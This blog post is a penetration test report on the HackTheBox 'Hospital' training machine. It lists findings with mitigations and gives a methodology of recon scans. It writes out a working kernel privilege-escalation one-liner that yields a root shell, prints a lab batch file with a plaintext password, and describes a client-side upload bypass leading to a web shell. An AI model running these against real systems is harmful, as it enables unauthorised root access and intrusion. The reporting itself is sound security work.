---
layout: post
title:  "HackTheBox Hospital Report"
date:   2024-06-11
categories:
  - cyber
  - report
comments: true
---

HackTheBox "Hospital" Machine  
Penetration Test Report

Patrick Double  
pat@patdouble.com  
[https://www.linkedin.com/in/patrick-double-28b44149/](https://www.linkedin.com/in/patrick-double-28b44149/)
<div class="page-break" style="page-break-before: always;"></div>

```table-of-contents
title: **Table of Contents**
```
<div class="page-break" style="page-break-before: always;"></div>

# Executive Summary

## Purpose and Scope

"Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a `RoundCube` instance. ..."
 - [https://app.hackthebox.com/machines/Hospital](https://app.hackthebox.com/machines/Hospital)

The goal was to identify security vulnerabilities within the machine, exploit the vulnerabilities to retrieve flags `user.txt` and  `root.txt`, and identify mitigations. The instance of Hospital tested used IP address `10.129.229.189`.

## Risks

### Full System Compromise (High Impact)

A full system compromise provides a computer under attacker control in the network. An Active Directory Domain Controller is running on this machine. If other machines are joined to this domain, they could be compromised.

### Sensitive Data Exfiltration (High Impact)

In the Roundcube web mail application, the account `drwilliams` was compromised. This user could have access to sensitive information transferred via email.

The web application on port 8080 asks patients to update health care information. This data is exposed to the attacker and would result in HIPPA violations.

### Account Takeover (Medium Impact)

In the Roundcube web mail application, the account `drwilliams` was compromised. The attacker can send email as this user. Depending on the authority and reputation of the user, the attacker could convince other users to take actions beneficial to the attacker.

## Recommendations

This section gives general recommendations that will reduce the risk of the findings occurring in the future. Recommendations specific to each finding are detailed in the next section.

### Asset Inventory
Software on the machine should be monitored for unauthorized install. Services, such as scheduled tasks, should be monitored.

### Regular Patching
A regular patching schedule should be maintained for all installed software.

### Password Requirements
Strong password requirements should be enforced.

### Secure Coding Education
Regular secure coding education for developers reduces the number of vulnerabilities introduced in code from the beginning. There are a number of organizations that provide secure code training.

### Vulnerability Scanning
Using a vulnerability scanner on deployment environments may find configuration errors, such as several of the HTTP cookie and header findings detailed below.

# Findings

| Finding ID       | [CWE](https://cwe.mitre.org/)                                                                                  | Risk/<br>Impact | Description                                     |
| ---------------- | -------------------------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------- |
| HTBHSPTL-2024-01 | [1395](https://cwe.mitre.org/data/definitions/1395.html)                                                       | Medium/High     | Unpatched Operating System                      |
| HTBHSPTL-2024-02 | [1395](https://cwe.mitre.org/data/definitions/1395.html)                                                       | Medium/High     | Unpatched GhostScript Software                  |
| HTBHSPTL-2024-03 | [250](https://cwe.mitre.org/data/definitions/250.html)                                                         | Medium/High     | Least Privilege of Windows Apache Service       |
| HTBHSPTL-2024-04 | [732](https://cwe.mitre.org/data/definitions/732.html)                                                         | Medium/High     | Least Privilege of Windows Apache Document Root |
| HTBHSPTL-2024-05 | [521](https://cwe.mitre.org/data/definitions/521.html)                                                         | High/Medium     | Weak Passwords                                  |
| HTBHSPTL-2024-06 | [434](https://cwe.mitre.org/data/definitions/434.html), [602](https://cwe.mitre.org/data/definitions/602.html) | Medium/Medium   | Improper Input Validation on File Upload        |
| HTBHSPTL-2024-07 | [250](https://cwe.mitre.org/data/definitions/250.html)                                                         | Medium/Medium   | Least Privilege of GhostScript Service          |
| HTBHSPTL-2024-08 | [1004](https://cwe.mitre.org/data/definitions/1004.html)                                                       | Medium/Medium   | Missing Cookie HttpOnly Attribute               |
| HTBHSPTL-2024-09 | [1275](https://cwe.mitre.org/data/definitions/1275.html)                                                       | Medium/Medium   | Missing Cookie SameSite Attribute               |
| HTBHSPTL-2024-10 | [352](https://cwe.mitre.org/data/definitions/352.html)                                                         | Medium/Medium   | Missing CSRF Token                              |
| HTBHSPTL-2024-11 | [693](https://cwe.mitre.org/data/definitions/693.html)                                                         | Low/Medium      | Missing Content Security Policy                 |
| HTBHSPTL-2024-12 | [1021](https://cwe.mitre.org/data/definitions/1021.html)                                                       | Low/Medium      | Missing Anti-clickjacking Header                |
| HTBHSPTL-2024-13 | [200](https://cwe.mitre.org/data/definitions/200.html)                                                         | High/Low        | Technology Information Disclosure               |

## HTBHSPTL-2024-01: Unpatched Operating System
### Observation
The tester found an unpatched version of the Linux kernel after compromising the web server on port 8080.

```shell
www-data@webserver:/var/www/html$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

### Affected Components
- Windows WSL Ubuntu on 10.129.229.189

### Description
"The product has a dependency on a third-party component that contains one or more known vulnerabilities."
- [MITRE CWE 1395](https://cwe.mitre.org/data/definitions/1395.html)

CVE-2023-2640 and CVE-2023-32629 were exploited using a proof of concept at [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629), gaining root access.

### Mitigation
Maintain a regular patch schedule.

### Validation
Login to the Ubuntu install with the `www-data` user. Attempt to run the exploit:

```shell
www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Verify root access is not obtained.
### References
- [https://nvd.nist.gov/vuln/detail/CVE-2023-2640](https://nvd.nist.gov/vuln/detail/CVE-2023-2640)
- [https://nvd.nist.gov/vuln/detail/CVE-2023-32629](https://nvd.nist.gov/vuln/detail/CVE-2023-32629)
- [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

## HTBHSPTL-2024-02: Unpatched GhostScript Software
### Observation
The tester found use of GhostScript to process `.eps` files. A Windows batch file `ghostscript.bat` was found and the version of GhostScript verified as vulnerable.

```
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
C:\Users\drbrown.HOSPITAL\Documents>

*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> cd "/Program Files/gs/gs10.01.1/bin"
*Evil-WinRM* PS C:\Program Files\gs\gs10.01.1\bin> .\gswin64c.exe
GPL Ghostscript 10.01.1 (2023-03-27)
Copyright (C) 2023 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
GS>
```

### Affected Components
- Windows user `drbrown` on 10.129.229.189

### Description
"The product has a dependency on a third-party component that contains one or more known vulnerabilities."
- [MITRE CWE 1395](https://cwe.mitre.org/data/definitions/1395.html)

CVE-2023-36664 was exploited to leverage command injection, using a proof of concept at [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection. 

### Mitigation
The software is running from a Windows batch file in the user `drbrown` account. It appears this is a user managed configuration. Work with IT to provide this service as a Windows service that is cataloged with IT assets. Then, patch management and vulnerability scanning can include the software in regular maintenance.

### Validation
Execute `gswin64c.exe` to verify the version is not out of date.

### References
- [https://nvd.nist.gov/vuln/detail/CVE-2023-36664](https://nvd.nist.gov/vuln/detail/CVE-2023-36664)
- [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
- [https://ghostscript.com/](https://ghostscript.com/)

## HTBHSPTL-2024-03: Least Privilege of Windows Apache Service
### Observation
The tester found the Windows Apache web server was running as the `SYSTEM` user. By exploiting excessive permissions in the document root, a web shell was introduced that revealed the service user.

### Affected Components
- Windows Apache web server

### Description
"The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
- [https://cwe.mitre.org/data/definitions/250.html](https://cwe.mitre.org/data/definitions/250.html)

Each system service should run with a dedicated service account. This allows the account to have the least privileges necessary for operation. The `SYSTEM` user should never be used to run services.

### Mitigation
Configure a dedicated service account for the Windows Apache web server.

### Validation
Inspect the Windows Apache service using Task Manager or other tool to validate the process is running as a service user other than `SYSTEM`.

### References
- [https://cwe.mitre.org/data/definitions/250.html](https://cwe.mitre.org/data/definitions/250.html)
- Finding HTBHSPTL-2024-04

## HTBHSPTL-2024-04: Least Privilege of Windows Apache Document Root
### Observation
The tester found the document root `C:\xampp\htdocs` for the Windows Apache web server allowed the `drbrown` user to write files. This allowed a web shell to be added, which resulted in lateral movement to the user running the web server.

### Affected Components
- Windows Apache web server

### Description
Separate user accounts should be used for differing functions. In this case the `drbrown` user is used to run the GhostScript command and to modify the web server documents. This multiple use of the account allowed a vulnerability in the GhostScript software to lead to malware added to the document root.

### Mitigation
Create a separate account for managing the document root. For users allowed to manage the document root, temporary access to the new account can be granted.

### Validation
Use the `icacls` Windows command to verify proper permissions of the `C:\xampp\htdocs` directory.

### References
- [https://cwe.mitre.org/data/definitions/732.html](https://cwe.mitre.org/data/definitions/732.html)

## HTBHSPTL-2024-05: Weak Passwords
### Observation
The tester was able to crack password hashes for the `admin` and `patient` users of the application running on port 8080, and the `drwilliams` account on the Ubuntu install. The time taken for cracking was measured in minutes. Re-use of a weak password in the `drwilliams` account allowed lateral movement from the Ubuntu install to the Windows install.

### Affected Components
- Web application on port 8080
- Ubuntu user `drwilliams`
- Windows user `drwilliams`

### Description
"Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism."
 - [https://cwe.mitre.org/data/definitions/521.html](https://cwe.mitre.org/data/definitions/521.html)

### Mitigation
- Use Windows features to enforce a strong password policy
- Use Ubuntu features to enforce a strong password policy
- Implement a strong password policy in the web application using techniques appropriate for PHP

### Validation
Use operating system features to validate a strong password policy.

For the web application, attempt to create users with weak passwords. It is not recommended to attempt to crack passwords of registered users. If successful, this will expose users passwords.

### References
- [https://cwe.mitre.org/data/definitions/521.html](https://cwe.mitre.org/data/definitions/521.html)

## HTBHSPTL-2024-06: Improper Input Validation on File Upload
### Observation
The tester found the web application on port 8080 used client side controls to limit file types to images. Using the Firefox dev tools, the tester was able to bypass this control and upload a malicious file.

### Affected Components
- Ubuntu hosted web application on port 8080

### Description
"When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms, resulting in potentially unexpected interactions between the client and server."
- [https://cwe.mitre.org/data/definitions/602.html](https://cwe.mitre.org/data/definitions/602.html)

### Mitigation
In addition to the client-side control, implement a server side control to only allow validate image files to be uploaded. Do not rely on the MIME type or file extension. Incorporate a trusted library to validate the contents of the file are a valid image.

### Validation
Use the Firefox dev tools to remove the client side control and attempt to upload a file that is not an image. See details in the Methodology section.

### References
- [https://cwe.mitre.org/data/definitions/434.html](https://cwe.mitre.org/data/definitions/434.html)
- [https://cwe.mitre.org/data/definitions/602.html](https://cwe.mitre.org/data/definitions/602.html)

## HTBHSPTL-2024-07: Least Privilege of GhostScript Service
### Observation
The tester found the GhostScript software is run from the `ghostscript.bat` file that includes user credentials.

```
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

### Affected Components
- Windows user `drbrown`

### Description
The `ghostscript.bat` file runs GhostScript using a user account. This exposes the plain text password. A dedicated service account should be used to run this software with the least privileges necessary.

### Mitigation
Create a service account for this featue. Use the Windows scheduled task facility to prevent exposure of the password.

### Validation
Verify through inspection the lack of a Windows batch file for this feature. Inspect the scheduled task for use of a dedicated service account.

### References
- [https://cwe.mitre.org/data/definitions/250.html](https://cwe.mitre.org/data/definitions/250.html)

## HTBHSPTL-2024-08: Missing Cookie HttpOnly Attribute
### Observation
The tester observed the `PHPSESSID` cookie used on port 8080 did not have the `HttpOnly` attribute set.

### Affected Components
- Web application on port 8080

### Description
"The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS."
 - [https://cwe.mitre.org/data/definitions/1004.html](https://cwe.mitre.org/data/definitions/1004.html)

### Mitigation
Configure the web application to enable the `HttpOnly` attribute according to the underlying technology.

### Validation
The Firefox dev tools may be used to inspect the attributes of a cookie. Open the browser to http://hospital.htb:8080. Open the dev tools window. Verify the `HttpOnly` column is `true`.

![](/assets/attachments/Pasted%20image%2020240611041910.png)

### References
- [https://cwe.mitre.org/data/definitions/1004.html](https://cwe.mitre.org/data/definitions/1004.html)

## HTBHSPTL-2024-09: Missing Cookie SameSite Attribute
### Observation
The tester observed the `PHPSESSID` cookie used on port 8080 did not have the `SameSite` attribute set.

### Affected Components
- Web application on port 8080

### Description
"The SameSite attribute controls how cookies are sent for cross-domain requests. This attribute may have three values: 'Lax', 'Strict', or 'None'. If the 'None' value is used, a website may create a cross-domain POST HTTP request to another website, and the browser automatically adds cookies to this request. This may lead to Cross-Site-Request-Forgery (CSRF) attacks if there are no additional protections in place (such as Anti-CSRF tokens)."
- [https://cwe.mitre.org/data/definitions/1275.html](https://cwe.mitre.org/data/definitions/1275.html)

### Mitigation
Configure the web application to set the `SameSite` attribute to `Strict` according to the underlying technology.

### Validation
The Firefox dev tools may be used to inspect the attributes of a cookie. Open the browser to [http://hospital.htb:8080](http://hospital.htb:8080). Open the dev tools window. Verify the `Same` column is not `None`.

![](/assets/attachments/Pasted%20image%2020240611041910.png)

### References
- [https://cwe.mitre.org/data/definitions/1275.html](https://cwe.mitre.org/data/definitions/1275.html)

## HTBHSPTL-2024-10: Missing CSRF Token
### Observation
The tester observed the web application on port 8080 does not use a CSRF (Cross-Site Request Forgery) token.

### Affected Components
- Web application on port 8080

### Description
"When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution."
- [https://cwe.mitre.org/data/definitions/352.html](https://cwe.mitre.org/data/definitions/352.html)

### Mitigation
"Use the "double-submitted cookie" method as described by Felten and Zeller:

When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.

Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.

This technique requires Javascript, so it may not work for browsers that have Javascript disabled."
- [https://cwe.mitre.org/data/definitions/352.html](https://cwe.mitre.org/data/definitions/352.html)

### Validation
Use a web application scanner to detect the presence of CSRF protection. Use a web application proxy, such as ZAP, to intercept requests and modify the CSRF token. Proper implementation will fail to process the request if the CSRF is modified.

### References
- [https://cwe.mitre.org/data/definitions/352.html](https://cwe.mitre.org/data/definitions/352.html)

## HTBHSPTL-2024-11: Missing Content Security Policy
### Observation
The tester observed the web application does not provide a CSP (Content Security Policy).

### Affected Components
- Roundcube web application on port 443
- Web application on port 8080

### Description
"**Content Security Policy** ([CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) and data injection attacks. These attacks are used for everything from data theft, to site defacement, to malware distribution."
- [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Mitigation
For the Roundcube application, the vendor must be contacted to properly configure a CSP. A misconfigured CSP can break the application.

For the custom application on port 8080, implement a CSP with the most restrictive policy possible.

### Validation
The Firefox dev tools can be used to inspect the response of requests to the applications. Look for the `Content-Security-Policy` HTTP headers.

### References
- [https://cwe.mitre.org/data/definitions/693.html](https://cwe.mitre.org/data/definitions/693.html)
- [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## HTBHSPTL-2024-12: Missing Anti-clickjacking Header
### Observation
The tester observed lack of HTTP headers mitigating click jacking attacks.

### Affected Components
- Roundcube web application on port 443
- Web application on port 8080

### Description
"Clickjacking (classified as a user interface redress attack or UI redressing) is a malicious technique of tricking a user into clicking on something different from what the user perceives, thus potentially revealing confidential information or allowing others to take control of their computer "
- [https://en.wikipedia.org/wiki/Clickjacking](https://en.wikipedia.org/wiki/Clickjacking)

### Mitigation
For the Roundcube application, the vendor must be contacted to properly configure the mitigation.

For the custom application on port 8080, implement a CSP including `frame-ancestors` or the `X-Frame-Options` header.

### Validation
The Firefox dev tools can be used to inspect the response of requests to the applications. Look for the `frame-ancestors` value in the `Content-Security-Policy` HTTP header, or the `X-Frame-Options` header.

### References
- [https://en.wikipedia.org/wiki/Clickjacking](https://en.wikipedia.org/wiki/Clickjacking)
- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)

## HTBHSPTL-2024-13: Technology Information Disclosure
### Observation
The tester observed the web applications expose server software information in the `Server` and `X-Powered-By` HTTP headers.

### Affected Components
- Roundcube web application on port 443
- Web application on port 8080

### Description
Exposure if the software and versions may allow attackers to find exploits more easily.

### Mitigation
Configure the web servers on both Ubuntu and Windows to not provide these headers.

### Validation
The Firefox dev tools can be used to inspect the response of requests to the applications. Look for the `Server` and `X-Powered-By` headers.

### References
- [https://cwe.mitre.org/data/definitions/200.html](https://cwe.mitre.org/data/definitions/200.html)

# Methodology

The tester employed an industry recognized method for conducting penetration testing. Below is a detailed account of how the tester identified and exploited the target, including all individual vulnerabilities discovered.

## Discovery

The IP address for this machine is `10.129.229.189`. The typical host name for Hack the Box machines is the name of the box and a TLD of `htb`. Add this to `/etc/hosts` as:
```
10.129.229.189 hospital.htb
```
### Service Enumeration

The tester enumerated network services using `nmap`.

```shell
$ nmap -p- -sV -sC -Pn -oN open-ports.txt -oX open-ports.xml --open hospital.htb
```

The interesting services are:

| Port              | Service  | Product                                                      |
| ----------------- | -------- | ------------------------------------------------------------ |
| 22                | ssh      | OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0) |
| 53                | dns      | Simple DNS Plus                                              |
| 88                | kerberos | Microsoft Windows Kerberos                                   |
| 139,445           | netbios  | Microsoft Windows SMB                                        |
| 389,636,3268,3269 | ldap     | Microsoft Windows Active Directory                           |
| 443               | https    | Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)              |
| 3389              | rdp      | Microsoft Terminal Services                                  |
| 5985              | winrm    | Microsoft WinRM                                              |
| 8080              | http     | Apache httpd 2.4.55 (Ubuntu)                                 |

There is a mix of Windows and Ubuntu services. WSL (Windows Services for Linux) can be used to run services on Linux inside Windows. We need to keep clear which operating system we're in during the process.

The enumeration found a Windows domain of `HOSPITAL`, verified our DNS domain of `hospital.htb` and an Active Directory domain controller `DC.hospital.htb`.

### TCP 139,445 Microsoft Windows SMB

The tester enumerated the SMB service looking for shares not protected by credentials. The files in the shares could provide information leading to compromise.

```shell
$ nmap -p139,445 --script=smb* -oN nmap-smb.txt -oX nmap-smb.xml hospital.htb

Nmap scan report for hospital.htb (10.129.229.189)
Host is up (0.14s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-print-text: false
| smb2-time: 
|   date: 2024-01-02T00:14:24
|_  start_date: N/A
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```shell
$ enum4linux hospital.htb

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan  1 12:12:17 2024

 =========================================( Target Information )=========================================

Target ........... hospital.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on hospital.htb )============================
[E] Can't find workgroup/domain

 ================================( Nbtstat Information for hospital.htb )================================
 
Looking up status of 10.129.229.189
No reply from 10.129.229.189

 ===================================( Session Check on hospital.htb )===================================
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.```

There are no unauthenticated shares.

### TCP 389,636,3268,3269 Active Directory Domain Controller

The tester tried enumeration of the AD LDAP service without authentication.

```shell
$ ldapsearch -H ldap://10.129.229.189 -x -D '' -w '' -b 'DC=hospital,DC=htb'
```

There was no useful information from the unauthenticated enumeration.

### TCP 443 HTTPS

To prepare for enumerating the http endpoints, the tester started and configured ZAP to intercept and inspect traffic.

![](/assets/attachments/Pasted%20image%2020240610045110.png)

The server hosts a webmail application.

![](/assets/attachments/Pasted%20image%2020240608154403.png)

Viewing the source of the page the tester found the application is "Roundcube".

![](/assets/attachments/Pasted%20image%2020240609081606.png)

The tester wanted to find the version to search for exploits. The page offers no obvious version number. The software may be available in a public repository. Comparison of file content may provide a version. Further review of the page source of the home page revealed something that may be a version, the `rcversion` attribute.

![](/assets/attachments/Pasted%20image%2020240610051038.png)

Searching GitHub for the software `roundcube`, and further by content `"rcversion"`, reveals the value may be computed from the software version.

![](/assets/attachments/Pasted%20image%2020240610051249.png)

Using the value of `10604` from the home page, the tester inferred Roundcube version 1.6.4. There is a `1.6.4` release shown in GitHub.

![](/assets/attachments/Pasted%20image%2020240610051648.png)

The tester performed a brute force search of virtual hosts to expand the attack surface.

```shell
$ gobuster --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt vhost -k -o gobuster-vhost-443-hospital.htb.txt --append-domain -u https://hospital.htb:443
```

Every attempt returned an HTTP status 200. The tester used `curl` to inspect the results of a less likely virtual host.

![](/assets/attachments/Pasted%20image%2020240610055625.png)
The Roundcube home page source was returned, indicating there are likely no virtual hosts on this port.

The ZAP spider was used to find additional resources.

![](/assets/attachments/Pasted%20image%2020240610062407.png)

![](/assets/attachments/Pasted%20image%2020240610062436.png)

![](/assets/attachments/Pasted%20image%2020240610062559.png)
Nothing out of the ordinary application resources was found.

There are interesting alerts from ZAP.

![](/assets/attachments/Pasted%20image%2020240610064451.png)
The lack of a CSP (Content Security Policy) may enable a XSS attack by allowing malicious code to be executed in the page and/or retrieved from an attacker controlled site.

![](/assets/attachments/Pasted%20image%2020240610070807.png)
The lack of a SameSite attribute may allow an XSS attack to expose the cookie. If the session cookie can be stolen, an account take over could be performed.

![](/assets/attachments/Pasted%20image%2020240610072439.png)
The server banner exposes the technology in use. The Apache web server is running on a Win64 architecture.  The application technology is PHP 8.0.28. This is important information to use when scanning for further vulnerabilities and crafting exploits.

The tester scanned for directories not found via spidering.
```shell
$ gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt dir -k -b 404,403 -o gobuster-webmail-dirs.txt -u https://hospital.htb:443

...
/examples             (Status: 503) [Size: 403]
/installer            (Status: 301) [Size: 343] [--> https://hospital.htb/installer/]
/Installer            (Status: 301) [Size: 343] [--> https://hospital.htb/Installer/]
...
```

The `/examples` directory is typical for a Windows XAMPP install. It is interesting that it infers XAMPP is being used, but typically nothing interesting in an `/examples` directory returning a 503.

The `/installer` directory is interesting. There may be configuration information including credentials. There being `/installer` and `/Installer` is an artifact of Windows filesystems being case insensitive. It's only necessary to consider one of them.

The tester scanned for files in `/installer`.

```shell
$ gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt dir -k -b 404,403 -o gobuster-webmail-installer-files.txt -u https://hospital.htb:443/installer/

/index.php            (Status: 302) [Size: 0] [--> ./?_step=1]
/config.php           (Status: 200) [Size: 53]
/test.php             (Status: 200) [Size: 53]
/.                    (Status: 302) [Size: 0] [--> ./?_step=1]
/styles.css           (Status: 200) [Size: 3348]
/check.php            (Status: 200) [Size: 53]
```

The tester opened [https://hospital.htb/installer/index.php](https://hospital.htb/installer/index.php). The installer looks correctly disabled.

![](/assets/attachments/Pasted%20image%2020240610075452.png)

The tester opened [https://hospital.htb/installer/config.php](https://hospital.htb/installer/config.php) and [https://hospital.htb/installer/test.php](https://hospital.htb/installer/test.php) to be sure.
![](/assets/attachments/Pasted%20image%2020240610075603.png)

### TCP 8080 HTTPS

Port 8080 redirects to a login page.

![](/assets/attachments/Pasted%20image%2020240610060251.png)

The tester created an account and inspected the response.

![](/assets/attachments/Pasted%20image%2020240611040737.png)

![](/assets/attachments/Pasted%20image%2020240611040950.png)

The tester then logged in with the new account.

![](/assets/attachments/Pasted%20image%2020240611041204.png)

The result presents a page with an upload form and logout button. It does not advertise any other functionality.

![](/assets/attachments/Pasted%20image%2020240611041232.png)

![](/assets/attachments/Pasted%20image%2020240611041355.png)

The login request/response shows the authentication is maintained using the standard PHP cookie `PHPSESSID`. It was not set as part of the login. The tester used the Firefox dev tools to inspect the cookie properties.

![](/assets/attachments/Pasted%20image%2020240611041910.png)

The `PHPSESSID` cookie is not `HttpOnly`. A cross-site scripting attack may allow a session to be stolen.

The server is advertised as `Apache/2.4.55 (Ubuntu)`. This server may be running under WSL.

Viewing the source, the tester noticed the upload form limits file to images. This is a client side control. If the server does not validate the upload, the tester can use ZAP to bypass and upload other content.

![](/assets/attachments/Pasted%20image%2020240611042909.png)

The tester uploaded an image file.

![](/assets/attachments/Pasted%20image%2020240611043530.png)

![](/assets/attachments/Pasted%20image%2020240611043624.png)

The source of the success page gave no indication of what further processing may have been done with the file.

![](/assets/attachments/Pasted%20image%2020240611043823.png)

The Firefox dev tools can be used to remove the client side upload limitation.

![](/assets/attachments/Pasted%20image%2020240611045928.png)

![](/assets/attachments/Pasted%20image%2020240611050004.png)

The tester was able to upload a PDF file after this change.

![](/assets/attachments/Pasted%20image%2020240611050110.png)

![](/assets/attachments/Pasted%20image%2020240611050128.png)

The tester performed a brute force search of virtual hosts to expand the attack surface.

```shell
$ gobuster --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt vhost -k -o gobuster-vhost-8080-hospital.htb.txt --append-domain -u http://hospital.htb:8080
```

No virtual hosts were found.

The ZAP spider was used to find additional resources. Nothing interesting was found. (The image is truncated to save space.)

![](/assets/attachments/Pasted%20image%2020240611050728.png)

There are interesting alerts from ZAP.

![](/assets/attachments/Pasted%20image%2020240611051600.png)

A lack of CSRF token could allow the tester to upload files on behalf of another user. This requires another vulnerability, such as XSS, to be present.

![](/assets/attachments/Pasted%20image%2020240611051624.png)
![](/assets/attachments/Pasted%20image%2020240611051643.png)

The above two alerts could be used to facilitate an XSS attack.

![](/assets/attachments/Pasted%20image%2020240611052546.png)
![](/assets/attachments/Pasted%20image%2020240611052558.png)
![](/assets/attachments/Pasted%20image%2020240611052612.png)

There are CVEs associated with vulnerable JavaScript libraries that could provide potential exploits.


![](/assets/attachments/Pasted%20image%2020240611051731.png)
![](/assets/attachments/Pasted%20image%2020240611052730.png)

These two vulnerabilities may allow an XSS attack to steal the session cookie and impersonate another user.

![](/assets/attachments/Pasted%20image%2020240611051858.png)

The tester scanned for directories not found via spidering.
```shell
$ gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt dir -k -b 404 -o gobuster-8080-dirs.txt --add-slash -u http://hospital.htb:8080

/images/              (Status: 403) [Size: 279]
/js/                  (Status: 403) [Size: 279]
/css/                 (Status: 403) [Size: 279]
/uploads/             (Status: 403) [Size: 279]
/fonts/               (Status: 403) [Size: 279]
/icons/               (Status: 403) [Size: 279]
/vendor/              (Status: 403) [Size: 279]
/server-status/       (Status: 403) [Size: 279]

```

The `/uploads/` directory is interesting. If the upload form saves the files into this directory, the tester may be able to obtain code execution.

The tester tried using the filename of a previously uploaded file. The URL is `http://hospital.htb:8080/uploads/canva-black-minimal-motivation-quote-linkedin-banner-HoRi-2buBWk.jpg` .

![](/assets/attachments/Pasted%20image%2020240611053727.png)

This worked and will be further investigated during exploitation.

## Vulnerabilities

### `PHPSESSID` is not HttpOnly, no SameSite attribute

No XSS vectors were found to exploit stealing a session cookie.

### Upload validation is client side only

